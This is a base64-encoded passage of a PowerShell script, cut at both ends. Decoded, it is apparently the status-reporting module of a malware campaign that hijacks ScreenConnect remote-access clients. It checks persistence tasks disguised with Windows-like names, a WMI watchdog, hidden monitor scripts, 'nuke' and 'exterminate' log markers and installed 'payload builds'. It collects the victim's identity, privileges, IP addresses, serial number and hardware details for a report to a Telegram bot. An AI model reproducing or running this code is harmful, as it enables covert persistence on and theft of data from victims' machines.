ICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVjdConKSB7IHJldHVybiB9CiAgICAgICAgICAg
IGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsKICAgICAgICAgICAgICAgIGlmICgkZG4gLWxpa2Ug
IiokdCoiKSB7CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4KICAgICAgICAg
ICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAg
fQogICAgfQoKICAgIHJldHVybiAkaGl0cwp9CgpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7CiAg
ICAkbGlzdCA9IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJp
bmddCiAgICBHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJl
LU9iamVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8IEZvckVh
Y2gtT2JqZWN0IHsKICAgICAgICAkZnAgPSBpZiAoJF8uTmFtZSAtbWF0Y2ggJ1woKFswLTlhLWZd
ezE2fSlcKScpIHsgJG1hdGNoZXNbMV0gfSBlbHNlIHsgJz8nIH0KICAgICAgICAkdGFnID0gaWYg
KCRmcCAtZXEgJzVmNjAxMDU3OTg1MmU1MDcnKSB7ICdLRUVQLVNFVlJaJyB9CiAgICAgICAgZWxz
ZWlmICgkZnAgLWVxICdmODYxYzgxNDBkNDUzNDI3JykgeyAnS0VFUC1BTFQnIH0KICAgICAgICBl
bHNlaWYgKCRmcCAtZXEgJzk5MDgxOThlNjY4ZTQ3NTAnKSB7ICdLRUVQLUdSWVhBJyB9CiAgICAg
ICAgZWxzZSB7ICdGT1JFSUdOJyB9CiAgICAgICAgW3ZvaWRdJGxpc3QuQWRkKCgnLSA8Y29kZT57
MH08L2NvZGU+OiA8Yj57MX08L2I+IFt7Mn1dJyAtZiAoRXNjICRfLk5hbWUpLCAoRXNjIChbc3Ry
aW5nXSRfLlN0YXR1cykpLCAkdGFnKSkKICAgIH0KCiAgICAkcm9vdHMgPSBAKAogICAgICAgICIk
e2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsCiAgICAgICAgIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxTY3JlZW5Db25uZWN0IENsaWVudCoiCiAgICApCiAgICBmb3Jl
YWNoICgkcGF0IGluICRyb290cykgewogICAgICAgIEdldC1DaGlsZEl0ZW0gLVBhdGggJHBhdCAt
RGlyZWN0b3J5IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qg
ewogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQoKCctIHBhdGg6IDxjb2RlPnswfTwvY29kZT4n
IC1mIChFc2MgJF8uRnVsbE5hbWUpKSkKICAgICAgICB9CiAgICB9CgogICAgJHVuaW5zdCA9IEAo
CiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9u
XFVuaW5zdGFsbFwqJywKICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5vZGVcTWljcm9z
b2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXConCiAgICApCiAgICBmb3JlYWNo
ICgkcGF0aCBpbiAkdW5pbnN0KSB7CiAgICAgICAgR2V0LUl0ZW1Qcm9wZXJ0eSAkcGF0aCAtRXJy
b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9iamVjdCB7CiAgICAgICAgICAgICRf
LkRpc3BsYXlOYW1lIC1saWtlICcqU2NyZWVuQ29ubmVjdConCiAgICAgICAgfSB8IEZvckVhY2gt
T2JqZWN0IHsKICAgICAgICAgICAgJHZlciA9IGlmICgkXy5EaXNwbGF5VmVyc2lvbikgeyAkXy5E
aXNwbGF5VmVyc2lvbiB9IGVsc2UgeyAnPycgfQogICAgICAgICAgICBbdm9pZF0kbGlzdC5BZGQo
KCctIG1zaTogPGNvZGU+ezB9PC9jb2RlPiB2ezF9JyAtZiAoRXNjICRfLkRpc3BsYXlOYW1lKSwg
KEVzYyAkdmVyKSkpCiAgICAgICAgfQogICAgfQoKICAgIGlmICgkbGlzdC5Db3VudCAtZXEgMCkg
eyBbdm9pZF0kbGlzdC5BZGQoJy0gKG5vbmUpJykgfQogICAgcmV0dXJuICRsaXN0Cn0KCiRjZmcg
PSBHZXQtQ2ZnCmlmICgtbm90ICRjZmcuQk9UX1RPS0VOIC1vciAtbm90ICRjZmcuQ0hBVF9JRCkg
ewogICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoIChKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3Qu
ZXJyJykgLVZhbHVlICd0Z19za2lwX25vX2NmZycgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUKICAgIGV4aXQgMgp9CgokcHJpbSA9ICdTY3JlZW5Db25uZWN0IENsaWVudCAoNWY2MDEwNTc5
ODUyZTUwNyknCiRhbHQgPSAnU2NyZWVuQ29ubmVjdCBDbGllbnQgKGY4NjFjODE0MGQ0NTM0Mjcp
Jwokb3MgPSBHZXQtT3NJbmZvCiR3aG8gPSBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVu
dGl0eV06OkdldEN1cnJlbnQoKS5OYW1lCiRlbGV2ID0gKFtTZWN1cml0eS5QcmluY2lwYWwuV2lu
ZG93c1ByaW5jaXBhbF1bU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eV06OkdldEN1
cnJlbnQoKSkuSXNJblJvbGUoCiAgICBbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdElu
Um9sZV06OkFkbWluaXN0cmF0b3IpCiRpc1N5c3RlbSA9ICR3aG8gLWxpa2UgJypTWVNURU0qJyAt
b3IgJHdobyAtZXEgJ05UIEFVVEhPUklUWVxTWVNURU0nCgokbXNpQ2FjaGUgPSBKb2luLVBhdGgg
JFdvcmtEaXIgJ3BrZy5tc2knCiRtc2lTaXplID0gaWYgKFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsK
ICAgICd7MDpOMH0gS0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSkuTGVuZ3RoIC8g
MUtCKQp9IGVsc2UgeyAnbm9uZScgfQoKJG1vblBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ293
bl9tb24uY21kJwokZXRsTW9uID0gIiRlbnY6UHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Np
c1xTdGF0ZVwuZXRsY2FjaGVcZXRsX21vbi5jbWQiCiRoYXNNb24gPSBUZXN0LVBhdGggJG1vblBh
dGgKJGhhc0V0bCA9IFRlc3QtUGF0aCAkZXRsTW9uCgojIFQxMDogb24tZGlzayBwYXlsb2FkIGJ1
aWxkIG1hcmtlcnMgLT4gZXZlcnkgcmVwb3J0IHByb3ZlcyBleGFjdGx5IHdoYXQgaXMgaW5zdGFs
bGVkCmZ1bmN0aW9uIEdldC1QYXlsb2FkQnVpbGQoW3N0cmluZ10kZmlsZSkgewogICAgaWYgKC1u
b3QgKFRlc3QtUGF0aCAkZmlsZSkpIHsgcmV0dXJuICdtaXNzaW5nJyB9CiAgICBmb3JlYWNoICgk
bCBpbiAoR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRmaWxlIC1Ub3RhbENvdW50IDggLUZvcmNl
IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKSkgewogICAgICAgIGlmICgkbCAtbWF0Y2gg
J0JVSUxEXHMrXGR7OH0oW0EtWl0rXGQrKScpIHsgcmV0dXJuICRtYXRjaGVzWzFdIH0KICAgIH0K
ICAgIHJldHVybiAnPycKfQokYk1vbiA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAkV29y
a0RpciAnb3duX21vbi5jbWQnKQokYlNlYyA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4tUGF0aCAk
V29ya0RpciAnb3duX3NlY3VyZS5jbWQnKQokYlRnciA9IEdldC1QYXlsb2FkQnVpbGQgKEpvaW4t
UGF0aCAkV29ya0RpciAndGdfcmVwb3J0LnBzMScpCiRiTGliID0gR2V0LVBheWxvYWRCdWlsZCAo
Sm9pbi1QYXRoICRXb3JrRGlyICdvd25fbGliLnBzMScpCgojIHBlci1ob3N0IGlkZW50aXR5OiBl
eHBlY3RlZCB0YXNrIG5hbWVzIGNvbWUgZnJvbSBpZGVudGl0eS5jZmcgd2hlbiBwcmVzZW50CiRp
ZENmZyA9IEpvaW4tUGF0aCAkV29ya0RpciAnaWRlbnRpdHkuY2ZnJwokaWRNYXAgPSBAe30KaWYg
KFRlc3QtUGF0aCAkaWRDZmcpIHsKICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkaWRDZmcg
fCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgaWYgKCRfIC1tYXRjaCAnXlxzKihbQS1aX10rKVxz
Kj1ccyooLis/KVxzKiQnKSB7ICRpZE1hcFskbWF0Y2hlc1sxXV0gPSAkbWF0Y2hlc1syXSB9CiAg
ICB9Cn0KJGV4cGVjdGVkVGFza3MgPSBAKAogICAgQHsgTmFtZSA9ICQoaWYgKCRpZE1hcC5UQVNL
X0EpIHsgJGlkTWFwLlRBU0tfQSB9IGVsc2UgeyAnV2VyUXVldWVTeW5jJyB9KTsgUm9sZSA9ICJ0
aWNrICQoJGlkTWFwLk1PX0EpbSAoY2hhaW4xKSIgfSwKICAgIEB7IE5hbWUgPSAkKGlmICgkaWRN
YXAuVEFTS19CKSB7ICRpZE1hcC5UQVNLX0IgfSBlbHNlIHsgJ1BsYVNlcnZlckhlYWx0aCcgfSk7
IFJvbGUgPSAiYmFja3VwICQoJGlkTWFwLk1PX0IpbSAoY2hhaW4xKSIgfSwKICAgIEB7IE5hbWUg
PSAkKGlmICgkaWRNYXAuVEFTS19DKSB7ICRpZE1hcC5UQVNLX0MgfSBlbHNlIHsgJ1dkaUhvc3RQ
cm94eScgfSk7IFJvbGUgPSAnT05TVEFSVCAoY2hhaW4xKScgfSwKICAgIEB7IE5hbWUgPSAkKGlm
ICgkaWRNYXAuVEFTS19EKSB7ICRpZE1hcC5UQVNLX0QgfSBlbHNlIHsgJ1RjcElwQ29uZmxpY3RS
ZXMnIH0pOyBSb2xlID0gJ09OTE9HT04gKGNoYWluMSknIH0KKQojIGNoYWluIDI6IFdNSSB3YXRj
aGRvZyBzdWJzY3JpcHRpb24KJHdtaUMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxz
dWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJOYW1l
PSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKJGV4cGVj
dGVkVGFza3MgKz0gQHsgTmFtZSA9ICdcV01JXFd1Y2FjaGVXYXRjaGRvZ0MnOyBSb2xlID0gJ3Rp
bWVyIDNtIChjaGFpbjIpJzsgV21pID0gKCRudWxsIC1uZSAkd21pQykgfQoKJHRhc2tMaW5lcyA9
IE5ldy1PYmplY3QgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtzdHJpbmddCiR0YXNr
T2sgPSAwCiR0YXNrQmFkID0gMApmb3JlYWNoICgkdCBpbiAkZXhwZWN0ZWRUYXNrcykgewogICAg
aWYgKCR0LkNvbnRhaW5zS2V5KCdXbWknKSkgewogICAgICAgIGlmICgkdC5XbWkpIHsgJHRhc2tP
aysrOyAkbWFyayA9ICdPSycgfSBlbHNlIHsgJHRhc2tCYWQrKzsgJG1hcmsgPSAnTUlTU0lORycg
fQogICAgICAgIFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+
IC0gezJ9JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xlKSkpCiAgICAgICAg
Y29udGludWUKICAgIH0KICAgICRoID0gR2V0LVRhc2tIZWFsdGggJHQuTmFtZQogICAgaWYgKCRo
LlByZXNlbnQgLWFuZCAkaC5IZWFsdGh5KSB7CiAgICAgICAgJHRhc2tPaysrCiAgICAgICAgJG1h
cmsgPSAnT0snCiAgICB9IGVsc2VpZiAoJGguUHJlc2VudCAtYW5kIC1ub3QgJGguT3Vycykgewog
ICAgICAgICR0YXNrQmFkKysKICAgICAgICAkbWFyayA9ICdOT1RfT1VSUycKICAgIH0gZWxzZWlm
ICgkaC5QcmVzZW50KSB7CiAgICAgICAgJHRhc2tCYWQrKwogICAgICAgICRtYXJrID0gJ1dFQUsn
CiAgICB9IGVsc2UgewogICAgICAgICR0YXNrQmFkKysKICAgICAgICAkbWFyayA9ICdNSVNTSU5H
JwogICAgfQogICAgJGV4dHJhID0gJycKICAgIGlmICgkaC5QcmVzZW50KSB7CiAgICAgICAgJGJp
dHMgPSBAKCkKICAgICAgICBpZiAoJGguU3RhdHVzKSB7ICRiaXRzICs9ICRoLlN0YXR1cyB9CiAg
ICAgICAgaWYgKCRoLlJlc3VsdCAtbmUgJycgLWFuZCAkaC5SZXN1bHQgLW5lICcwJykgeyAkYml0
cyArPSAoIkxhc3RSZXN1bHQ9IiArICRoLlJlc3VsdCkgfQogICAgICAgIGlmICgkYml0cy5Db3Vu
dCkgeyAkZXh0cmEgPSAnICgnICsgKCRiaXRzIC1qb2luICcsICcpICsgJyknIH0KICAgIH0KICAg
IFt2b2lkXSR0YXNrTGluZXMuQWRkKCgnLSBbezB9XSA8Y29kZT57MX08L2NvZGU+IC0gezJ9ezN9
JyAtZiAkbWFyaywgKEVzYyAkdC5OYW1lKSwgKEVzYyAkdC5Sb2xlKSwgKEVzYyAkZXh0cmEpKSkK
fQoKJHByaW1MaW5lID0gR2V0LVN2Y0xpbmUgJHByaW0KJGFsdExpbmUgPSBHZXQtU3ZjTGluZSAk
YWx0CiRwcmltT2sgPSAkcHJpbUxpbmUgLWxpa2UgJ1J1bm5pbmcqJwokZGVwbG95T2sgPSAkcHJp
bU9rIC1hbmQgKCR0YXNrT2sgLWdlIDMpIC1hbmQgJGhhc01vbgoKJGVtb2ppTWFwID0gQHsKICAg
IE9LICAgICAgID0gW3N0cmluZ10oW2NoYXJdMHgyNzA1KQogICAgRE9XTiAgICAgPSAoW3N0cmlu
Z11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjZBOCkpCiAgICBSRVNUT1JFRCA9IChbc3Ry
aW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGN0UyKSkKICAgIEZBSUwgICAgID0gW3N0
cmluZ10oW2NoYXJdMHgyNzRDKQogICAgRk9SQ0UgICAgPSBbc3RyaW5nXShbY2hhcl0weDI2QTEp
CiAgICBERVBMT1kgICA9IChbc3RyaW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNjgw
KSkKICAgIEhCICAgICAgID0gKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJvbVV0ZjMyKDB4MUY0
RTEpKQp9CiRrZXkgPSAkU3RhdGUuVG9VcHBlckludmFyaWFudCgpCiRlbW9qaSA9IGlmICgkZW1v
amlNYXAuQ29udGFpbnNLZXkoJGtleSkpIHsgJGVtb2ppTWFwWyRrZXldIH0gZWxzZSB7IChbc3Ry
aW5nXVtjaGFyXTo6Q29udmVydEZyb21VdGYzMigweDFGNEYxKSkgfQoKJHRpdGxlID0gc3dpdGNo
ICgka2V5KSB7CiAgICAnT0snIHsgJ1ByaW1hcnkgaGVhbHRoeScgfQogICAgJ0RPV04nIHsgJ1By
aW1hcnkgRE9XTiAtIGhlYWxpbmcnIH0KICAgICdSRVNUT1JFRCcgeyAnUHJpbWFyeSBSRVNUT1JF
RCcgfQogICAgJ0ZBSUwnIHsgJ0hlYWwgRkFJTEVEJyB9CiAgICAnRk9SQ0UnIHsgJ0ZvcmNlZCBy
ZWluc3RhbGwnIH0KICAgICdERVBMT1knIHsgaWYgKCRkZXBsb3lPaykgeyAnRklSU1QgREVQTE9Z
IE9LJyB9IGVsc2UgeyAnRklSU1QgREVQTE9ZIC0gQ0hFQ0sgTkVFREVEJyB9IH0KICAgICdIQicg
eyAnaG91cmx5IGRpZ2VzdCcgfQogICAgZGVmYXVsdCB7ICJTdGF0ZTogJFN0YXRlIiB9Cn0KCiR0
cmFucyA9IGlmICgkT2xkU3RhdGUpIHsgIiRPbGRTdGF0ZSAtPiAkU3RhdGUiIH0gZWxzZSB7ICRT
dGF0ZSB9CiRzY0xpc3QgPSBHZXQtU2NJbnN0YWxscwokcm1tSGl0cyA9IEdldC1SbW1IaXRzCmlm
ICgkcm1tSGl0cy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kcm1tSGl0cy5BZGQoJy0gKG5vbmUgZGV0
ZWN0ZWQpJykgfQoKJHB1YiA9IEdldC1QdWJsaWNJcAokbGFuID0gR2V0LUxvY2FsSXBzCiRub3cg
PSBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tOnNzIHp6eicKJHVwdGltZSA9ICdu
L2EnCnRyeSB7CiAgICAkYm9vdCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfT3BlcmF0aW5nU3lz
dGVtKS5MYXN0Qm9vdFVwVGltZQogICAgJHVwdGltZSA9ICd7MDpkZH1kIHswOmhofWggezA6bW19
bScgLWYgKChHZXQtRGF0ZSkgLSAkYm9vdCkKfSBjYXRjaCB7fQoKIyBjYW1wYWlnbiBzdGF0ZSBm
aWxlICh3cml0dGVuIGJ5IG93bl9saWIucHMxIHN0YXRlIGFjdGlvbikKJHN0YXRlTGluZSA9ICdu
L2EnCiRzdGF0ZU9iaiA9ICRudWxsCiRzdGF0ZVBhdGgyID0gSm9pbi1QYXRoICRXb3JrRGlyICdz
dGF0ZS5qc29uJwppZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgyKSB7CiAgICAkcmF3U3RhdGUgPSAo
R2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICRzdGF0ZVBhdGgyIC1SYXcpLlRyaW0oKQogICAgdHJ5
IHsKICAgICAgICAkc3RhdGVPYmogPSAkcmF3U3RhdGUgfCBDb252ZXJ0RnJvbS1Kc29uCiAgICAg
ICAgJGZvcmVpZ25Dc3YgPSBpZiAoJHN0YXRlT2JqLmZvcmVpZ24pIHsgKCRzdGF0ZU9iai5mb3Jl
aWduIC1qb2luICcsJykgfSBlbHNlIHsgJy0nIH0KICAgICAgICAkc3RhdGVMaW5lID0gInByaW09
JCgkc3RhdGVPYmoucHJpbSkgYWx0PSQoJHN0YXRlT2JqLmFsdCkgZm9yZWlnbj1bJGZvcmVpZ25D
c3ZdIHRhc2tzPSQoJHN0YXRlT2JqLnRhc2tzT2spLyQoJHN0YXRlT2JqLnRhc2tzVG90YWwpIHdk
PSQoJHN0YXRlT2JqLndhdGNoZG9nKSBoZWFscz0kKCRzdGF0ZU9iai5pbnN0YWxsQ291bnQpIgog
ICAgfSBjYXRjaCB7ICRzdGF0ZUxpbmUgPSAkcmF3U3RhdGUgfQp9CgokZGVwbG95QmxvY2sgPSAn
JwppZiAoJGtleSAtZXEgJ0RFUExPWScpIHsKICAgICR2ZXJkaWN0ID0gaWYgKCRkZXBsb3lPaykg
eyAnREVQTE9ZRUQgLyBIRUFMVEhZJyB9IGVsc2UgeyAnREVQTE9ZRUQgQlVUIElOQ09NUExFVEUn
IH0KICAgICRmb3JlaWduID0gQChHZXQtQ2hpbGRJdGVtIC1QYXRoICIke2VudjpQcm9ncmFtRmls
ZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTY3Jl
ZW5Db25uZWN0IENsaWVudCoiIC1EaXJlY3RvcnkgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGlu
dWUgfAogICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLk5hbWUgLW5vdG1hdGNoICc1ZjYwMTA1Nzk4
NTJlNTA3fGY4NjFjODE0MGQ0NTM0Mjd8OTkwODE5OGU2NjhlNDc1MCcgfSkKICAgICRkaWFnTGlu
ZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQog
ICAgJGJvb3RQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdib290LmVycicKICAgIGlmIChUZXN0
LVBhdGggJGJvb3RQYXRoKSB7CiAgICAgICAgJGludGVyZXN0aW5nID0gQCgKICAgICAgICAgICAg
J21zaV8nLCAnZmV0Y2hfJywgJ3ByaW1hcnlfJywgJ251a2VfJywgJ21zaV90b28nLCAnbXNpX2Zl
dGNoJywgJ21zaV9leGl0JywKICAgICAgICAgICAgJ21zaV91bmF2YWlsYWJsZScsICdzZWN1cmVf
JywgJ2dvXycsICdleHRlcm1pbmF0ZV8nLCAnaWRlbnRpdHlfJywKICAgICAgICAgICAgJ2NyZWF0
ZV90YXNrJywgJ3ZlcmlmeV90YXNrJywgJ29ycGhhbl8nLCAnc3RhbGVfJywgJ3Bvc3RpbnN0YWxs
JywgJ2FsdF8nCiAgICAgICAgKQogICAgICAgIEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkYm9v
dFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfAogICAgICAgICAgICBXaGVyZS1P
YmplY3QgewogICAgICAgICAgICAgICAgJGxpbmUgPSAkXwogICAgICAgICAgICAgICAgZm9yZWFj
aCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlmICgkbGluZSAtbGlrZSAiKiR0KiIpIHsgcmV0dXJu
ICR0cnVlIH0gfQogICAgICAgICAgICAgICAgJGZhbHNlCiAgICAgICAgICAgIH0gfAogICAgICAg
ICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDI2IHwKICAgICAgICAgICAgRm9yRWFjaC1PYmplY3Qg
eyBbdm9pZF0kZGlhZ0xpbmVzLkFkZCgoJy0gPGNvZGU+ezB9PC9jb2RlPicgLWYgKEVzYyAoJF8g
LXJlcGxhY2UgJ1teXHgyMC1ceDdFXScsICc/JykpKSkgfQogICAgfQogICAgaWYgKCRkaWFnTGlu
ZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoJy0gKG5vIGluc3RhbGwvbnVr
ZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0KICAgICRkZXBsb3lCbG9jayA9IEAiCgo8Yj5EZXBs
b3kgdmVyZGljdDwvYj4KLSBSZXN1bHQ6IDxiPiQoRXNjICR2ZXJkaWN0KTwvYj4KLSBQcmltYXJ5
IFJ1bm5pbmc6ICQoaWYgKCRwcmltT2spIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIE1vbml0
b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9uLmNtZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycg
fSBlbHNlIHsgJ05PJyB9KQotIEJhY2t1cCBtb24gKC5ldGxjYWNoZVxldGxfbW9uLmNtZCk6ICQo
aWYgKCRoYXNFdGwpIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQotIFBlcnNpc3QgdGFza3MgT0s6
ICR0YXNrT2sgLyAkKCRleHBlY3RlZFRhc2tzLkNvdW50KSAoYmFkL21pc3Npbmc6ICR0YXNrQmFk
KQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNpemUpCi0gRm9yZWlnbiBTQyBmb2xkZXJzIGxlZnQ6
ICQoJGZvcmVpZ24uQ291bnQpCi0gTm90ZTogTGFzdFJlc3VsdCAyNjcwMTEgPSB0YXNrIG5vdCB5
ZXQgcnVuIChub3JtYWwgcmlnaHQgYWZ0ZXIgY3JlYXRlKQoKPGI+RGVwbG95IGxvZyBtYXJrZXJz
PC9iPgokKCRkaWFnTGluZXMgLWpvaW4gImBuIikKIkAKfQoKJHRleHQgPSBAIgokZW1vamkgPGI+
U0MgTW9uaXRvciAtICQoRXNjICR0aXRsZSk8L2I+Cgo8Yj5FdmVudDwvYj4KLSBTdW1tYXJ5OiAk
KEVzYyAkU3VtbWFyeSkKLSBUcmFuc2l0aW9uOiA8Y29kZT4kKEVzYyAkdHJhbnMpPC9jb2RlPgot
IFdoZW46ICQoRXNjICRub3cpCi0gU291cmNlIGJ1aWxkOiA8Y29kZT4kKEVzYyAkQnVpbGQpPC9j
b2RlPgokZGVwbG95QmxvY2sKCjxiPkhvc3Q8L2I+Ci0gQ29tcHV0ZXI6IDxjb2RlPiQoRXNjICRl
bnY6Q09NUFVURVJOQU1FKTwvY29kZT4KLSBVc2VyOiA8Y29kZT4kKEVzYyAkd2hvKTwvY29kZT4K
LSBFbGV2YXRlZDogJGVsZXYgfCBTWVNURU06ICRpc1N5c3RlbQotIERvbWFpbi9Xb3JrZ3JvdXA6
ICQoRXNjICRvcy5Eb21haW4pCgo8Yj5OZXR3b3JrPC9iPgotIExBTiBJUHM6IDxjb2RlPiQoRXNj
ICRsYW4pPC9jb2RlPgotIFB1YmxpYyBJUDogPGNvZGU+JChFc2MgJHB1Yik8L2NvZGU+Cgo8Yj5P
UyAvIEhhcmR3YXJlPC9iPgotIE9TOiAkKEVzYyAkb3MuQ2FwdGlvbikKLSBWZXJzaW9uOiAkKEVz
YyAkb3MuVmVyc2lvbikgKGJ1aWxkICQoRXNjICRvcy5CdWlsZCkpICQoRXNjICRvcy5BcmNoKQot
IEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxsRGF0ZSkgfCBMYXN0IGJvb3Q6ICQoRXNjICRvcy5M
YXN0Qm9vdCkKLSBVcHRpbWU6ICQoRXNjICR1cHRpbWUpCi0gQ1BVOiAkKEVzYyAkb3MuQ1BVKQot
IEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAkKEVzYyAkb3MuTW9kZWwpCi0gU2Vy
aWFsOiA8Y29kZT4kKEVzYyAkb3MuU2VyaWFsKTwvY29kZT4KLSBSQU06ICQoJG9zLlRvdGFsUkFN
X0dCKSBHQgotIERpc2sgQzogJCgkb3MuRGlza0ZyZWVfR0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNr
U2l6ZV9HQikgR0IKCjxiPlNjcmVlbkNvbm5lY3QgKGFsbCk8L2I+Ci0gU2V2cnogPGNvZGU+NWY2
MDEwNTc5ODUyZTUwNzwvY29kZT46ICQoRXNjICRwcmltTGluZSkKLSBBbHQgPGNvZGU+Zjg2MWM4
MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRhbHRMaW5lKQotIEdyeXhhIDxjb2RlPjk5MDgxOThl
NjY4ZTQ3NTA8L2NvZGU+OiAkKEVzYyAoR2V0LVN2Y0xpbmUgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50
ICg5OTA4MTk4ZTY2OGU0NzUwKScpKQokKCRzY0xpc3QgLWpvaW4gImBuIikKCjxiPk90aGVyIFJN
TSAvIHJlbW90ZSB0b29sczwvYj4KJCgkcm1tSGl0cyAtam9pbiAiYG4iKQoKPGI+UGVyc2lzdCB0
YXNrcyAoZXhwZWN0ZWQpPC9iPgokKCR0YXNrTGluZXMgLWpvaW4gImBuIikKCjxiPkNhY2hlPC9i
PgotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNpemUpCi0gV29ya0RpcjogPGNvZGU+JChFc2MgJFdv
cmtEaXIpPC9jb2RlPgoKPGI+UGF5bG9hZCBidWlsZHMgKGluc3RhbGxlZCBvbiB0aGlzIGhvc3Qp
PC9iPgotIDxjb2RlPk1PTj0kYk1vbiB8IFNFQz0kYlNlYyB8IFRHUj0kYlRnciB8IExJQj0kYkxp
YjwvY29kZT4KCjxiPkNhbXBhaWduIHN0YXRlPC9iPgotIDxjb2RlPiQoRXNjICRzdGF0ZUxpbmUp
PC9jb2RlPgoKPGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCAkYlRncjwvaT4KIkAK
CiMgY29tcGFjdCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAoaG91cmx5
IGhlYXJ0YmVhdCkKaWYgKCRNb2RlIC1lcSAnY29tcGFjdCcpIHsKICAgICRmb3JlaWduTiA9IDAK
ICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9yZWlnbk4gPSBA
KCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9CiAgICAkbXNpU2hvcnQgPSBpZiAoVGVzdC1QYXRo
ICRtc2lDYWNoZSkgeyAnezA6TjB9S0InIC1mICgoR2V0LUl0ZW0gJG1zaUNhY2hlIC1Gb3JjZSku
TGVuZ3RoIC8gMUtCKSB9IGVsc2UgeyAnMCcgfQogICAgJHByaW1TaG9ydCA9IGlmICgkcHJpbU9r
KSB7ICdPSycgfSBlbHNlIHsgJ0RPV04nIH0KICAgICRhbHRTaG9ydCA9IGlmICgkYWx0TGluZSAt
bGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0KICAgICRncnl4YUxpbmUgPSBH
